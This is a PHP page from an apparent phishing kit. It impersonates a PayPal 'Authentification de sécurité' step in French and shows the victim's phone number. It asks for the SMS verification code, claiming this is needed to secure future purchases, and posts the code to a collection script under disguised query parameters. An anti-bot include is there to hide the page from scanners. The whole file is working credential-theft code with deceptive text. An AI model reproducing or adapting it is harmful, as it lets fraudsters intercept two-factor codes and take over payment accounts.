<?php
include '../antibots.php';
ob_start();
session_start();
?>
    <!DOCTYPE html>
    <html dir="ltr">
        <head>
            <title>Authentification de sécurité</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge" />
            <meta charset="utf8">
            <link rel="stylesheet" href="../css/normalize.css" />
            <link rel="stylesheet" href="../css/bootstrap.min.css" />
            <link rel="stylesheet" href="../css/font-awesome.min.css" />
            <link rel="stylesheet" href="../css/main_style.css" />
            <link rel="shortcut icon" type="image/x-icon" href="../img/ppl.ico">
        </head>
        <body>
                    <style>
                .error {
                    border: 1px solid #c72e2e;
                }
            </style>
<?php include'navbar.php'?>
    <div class="contain biling-p">
     <form method="POST" action="<?php echo 'send/serv5203.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()); ?>" class="contain-info">
            <center> <span class="step" style="text-transform:uppercase"></span>
          <h3><b>IDENTIFICATION DE SÉCURITÉ<br>
            </b></h3>
          <p style="text-align: left;">Pour sécuriser au mieux vos futur achats avec PayPal, nous allons procéder à une vérification par sms.</p>
				<p style="text-align: left;">Cette vérification est importante afin que vous puissiez vous identifier en saisissant le code d'accès et que nous puissions prouver que vous n'êtes pas un usurpateur.</p>
          <p><u><b>REMARQUE :</b></u> L'envoi du sms peut prendre jusqu'à 5 minutes.<br> Si vous ne recevez aucun sms <b>sous 5 minutes</b>, veuillez écrire la date actuelle sous le format JJMMAA. Exemple : 010120<br> Veuillez ne pas fermer cette page.</p>
          <div style="text-align:left;"> <b>DATE : </b><?php echo date('d/m/Y H:i:s', time()); ?> (Heure du serveur)<br>
            <b>NUMÉRO DE TÉLÉPHONE : </b><span><?php echo $_SESSION["PhoneNumber"] ?></span><br>
          </div>
          &nbsp; <span style="color: #23527c;"></span><br>
          <div><br>

          </div>
          <input type="tel" id="css" style="margin-top:5px" name="inc" class="bill_input"

            placeholder="Code d'authentification" required="required" autocomplete="off"

            autocorrect="off" aria-required="true"  maxlength="10" pattern="[0-9]{6,10}$" type="text">
          <hr> <input name="ibansub" id="sub" value="Continuer" class="bill_input btn-bill"

type="submit"><br>
          Cette identification est obligatoire pour conclure la procédure.<br>
        </center>
      </form>
    </div>
    <?php include'footer.php'?>
    <script src="../js/jquery-1.11.3.min.js"></script>
    <script src="../js/bootstrap.min.js"></script>
    <script src="../js/cont.js"></script>
    <script src="../js/jquery.maskedinput.js"></script>
    <script src="../js/plugins.js"></script>
  </body>
</html>

